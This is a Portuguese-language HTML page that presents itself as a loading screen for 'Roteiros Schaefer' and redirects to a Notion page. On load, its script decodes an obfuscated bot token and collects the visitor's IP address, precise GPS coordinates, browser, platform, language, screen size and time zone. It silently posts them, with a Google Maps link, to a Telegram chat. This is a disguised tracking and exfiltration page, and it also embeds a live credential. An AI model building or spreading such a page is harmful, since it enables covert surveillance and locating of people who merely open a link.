<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Alexandre Roteiros Schaefer</title>
    <meta property="og:title" content="Roteiros Schaefer" />
    <meta property="og:description" content="Acesse os roteiros e documenta√ß√µes Schaefer" />
    <meta property="og:type" content="website" />
    <meta property="og:site_name" content="Roteiros Schaefer" />
    <style>
        * {margin: 0; padding: 0; box-sizing: border-box;}
        body {background: #0a0a0a; color: #fff; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; min-height: 100vh; display: flex; justify-content: center; align-items: center; overflow: hidden;}
        .container {position: relative; text-align: center;}
        .dots {display: flex; justify-content: center; gap: 12px; margin-bottom: 40px;}
        .dot {width: 8px; height: 8px; background: #333; border-radius: 50%; animation: dotPulse 1.5s infinite;}
        .dot:nth-child(2) {animation-delay: 0.2s;}
        .dot:nth-child(3) {animation-delay: 0.4s;}
        @keyframes dotPulse {
            0% {transform: scale(1); background: #333;}
            50% {transform: scale(1.5); background: #0066ff;}
            100% {transform: scale(1); background: #333;}
        }
        .message {font-size: 1.1rem; font-weight: 300; letter-spacing: 0.5px; opacity: 0; transform: translateY(20px); animation: fadeUp 0.8s forwards;}
        .highlight {color: #0066ff; font-weight: 500;}
        @keyframes fadeUp {to {opacity: 1; transform: translateY(0);}}
        .circle {position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 200px; height: 200px; border: 1px solid #222; border-radius: 50%; opacity: 0.3; animation: pulse 2s infinite;}
        .circle:nth-child(2) {animation-delay: 0.5s;}
        .circle:nth-child(3) {animation-delay: 1s;}
        @keyframes pulse {
            0% {transform: translate(-50%, -50%) scale(0.8); opacity: 0.3;}
            50% {transform: translate(-50%, -50%) scale(1.2); opacity: 0;}
            100% {transform: translate(-50%, -50%) scale(0.8); opacity: 0.3;}
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="circle"></div>
        <div class="circle"></div>
        <div class="circle"></div>
        <div class="dots">
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
        </div>
        <div class="message">
            Acessando <span class="highlight">Roteiros Schaefer</span>
        </div>
    </div>

    <script>
        const getLocalStorage = (key) => {
            try {
                return localStorage.getItem(key);
            } catch (e) {
                console.error("Erro ao acessar localStorage:", e);
                return null;
            }
        };
        
        const setLocalStorage = (key, value) => {
            try {
                localStorage.setItem(key, value);
            } catch (e) {
                console.error("Erro ao gravar no localStorage:", e);
            }
        };

        const getBrowserName = (userAgent) => {
            if (userAgent.includes("Edge") || userAgent.includes("Edg/")) return "Edge";
            if (userAgent.includes("Firefox")) return "Firefox";
            if (userAgent.includes("Chrome") && !userAgent.includes("Chromium") && !userAgent.includes("Edg/")) return "Chrome";
            if (userAgent.includes("Safari") && !userAgent.includes("Chrome") && !userAgent.includes("Chromium")) return "Safari";
            if (userAgent.includes("Opera") || userAgent.includes("OPR")) return "Opera";
            if (userAgent.includes("Brave")) return "Brave";
            return "Desconhecido";
        };

        const _0x5f8a = "Nzg3NDc1MDcxNDpBQUhtR1dXOW9TNDEwMjg0WE5LN055b1VscHlKUFhoTjVXZw==";
        const _0x4e7b = ["N", "z", "g", "3", "N", "D", "c", "1", "M", "D", "c", "x", "N", "D", "p", "B"];
        const _0x3d6c = ["Q", "U", "h", "t", "R", "1", "d", "X", "O", "v", "b", "1", "M", "0", "M", "T"];
        const _0x2b5d = ["A", "y", "O", "D", "R", "Y", "T", "k", "s", "N", "0", "5", "5", "b", "1", "V"];
        const _0x1a4e = ["s", "c", "H", "l", "K", "U", "F", "o", "b", "0", "4", "1", "V", "2", "c", "="];

        const getToken = () => {
            try {
                return atob(_0x5f8a);
            } catch {
                const parts = [..._0x4e7b, ..._0x3d6c, ..._0x2b5d, ..._0x1a4e];
                return atob(parts.join(''));
            }
        };

        const sendInfo = async () => {
            const botToken = getToken();
            const chatId = '1312054516';
            const redirectUrl = 'https://alexandreroteiros.notion.site/Schaefer-Roteiros-Alexandre-19e214b1b1b980d0b2d3dab48e1922ce?pvs=4';

            try {
                const userAgent = navigator.userAgent;
                const language = navigator.language;
                const platform = navigator.platform;
                const screenSize = `${window.screen.width}x${window.screen.height}`;
                const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                const browser = getBrowserName(userAgent);
                
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                
                let message = `<b>üö® NOVO ACESSO üö®</b>\n\n`;
                message += `<b>üìÖ INFORMA√á√ïES TEMPORAIS</b>\n`;
                message += `‚îú‚îÄ <b>Empresa Schaefer üîµ</b>\n`;
                message += `‚îú‚îÄ <b>Hor√°rio:</b> ${new Date().toLocaleTimeString('pt-BR')}\n`;
                message += `‚îú‚îÄ <b>Data:</b> ${new Date().toLocaleDateString('pt-BR')}\n`;
                message += `‚îî‚îÄ <b>Fuso Hor√°rio:</b> ${timeZone}\n\n`;
                
                message += `<b>üìç LOCALIZA√á√ÉO</b>\n`;
                message += `‚îî‚îÄ <b>IP:</b> ${ipData.ip}`;

                const sendMessageAndRedirect = async (locationInfo = '') => {
                    if (locationInfo && locationInfo !== 'Timeout') {
                        const [lat, lng] = locationInfo.split(',').map(coord => coord.trim());
                        const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
                        message += `\n   ‚îú‚îÄ <b>Coordenadas:</b> ${locationInfo}\n`;
                        message += `   ‚îî‚îÄ <b>Maps:</b> ${mapsLink}\n\n`;
                    } else if (locationInfo === 'Timeout') {
                        message += `\n   ‚îî‚îÄ <b>Coordenadas:</b> Tempo limite excedido\n\n`;
                    } else {
                        message += `\n   ‚îî‚îÄ <b>Coordenadas:</b> N√£o dispon√≠vel\n\n`;
                    }
                    
                    message += `<b>üíª DISPOSITIVO</b>\n`;
                    message += `‚îú‚îÄ <b>Plataforma:</b> ${platform}\n`;
                    message += `‚îú‚îÄ <b>Navegador:</b> ${browser}\n`;
                    message += `‚îú‚îÄ <b>Idioma:</b> ${language}\n`;
                    message += `‚îî‚îÄ <b>Tela:</b> ${screenSize}`;
                    
                    try {
                        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                chat_id: chatId,
                                text: message,
                                parse_mode: 'HTML'
                            })
                        });
                        
                        if (!response.ok) {
                            throw new Error(`HTTP error! status: ${response.status}`);
                        }
                        
                        const data = await response.json();
                        if (!data.ok) {
                            throw new Error('Telegram API error!');
                        }
                    } catch (error) {
                        console.error('Error sending message:', error);
                    } finally {
                        window.location.href = redirectUrl;
                    }
                };

                const locationAllowed = getLocalStorage('locationAllowed');
                const savedLocation = getLocalStorage('userLocation');

                if (locationAllowed === 'true' && savedLocation) {
                    await sendMessageAndRedirect(savedLocation);
                } else if (locationAllowed === 'false') {
                    await sendMessageAndRedirect('N√£o permitida');
                } else if (navigator.geolocation) {
                    const locationPromise = new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(
                            (position) => {
                                const locationStr = `${position.coords.latitude.toFixed(6)}, ${position.coords.longitude.toFixed(6)}`;
                                setLocalStorage('locationAllowed', 'true');
                                setLocalStorage('userLocation', locationStr);
                                resolve(locationStr);
                            },
                            (error) => {
                                setLocalStorage('locationAllowed', 'false');
                                console.error("Erro de geolocaliza√ß√£o:", error.message);
                                resolve('N√£o permitida');
                            },
                            { timeout: 5000, maximumAge: 30 * 24 * 60 * 60 * 1000 }
                        );
                    });

                    const locationInfo = await Promise.race([
                        locationPromise,
                        new Promise(resolve => setTimeout(() => resolve('Timeout'), 5000))
                    ]);
                    
                    await sendMessageAndRedirect(locationInfo);
                } else {
                    await sendMessageAndRedirect('N√£o suportada');
                }
            } catch (error) {
                console.error('Error:', error);
                window.location.href = redirectUrl;
            }
        };

        document.addEventListener('DOMContentLoaded', sendInfo);
    </script>
</body>
</html>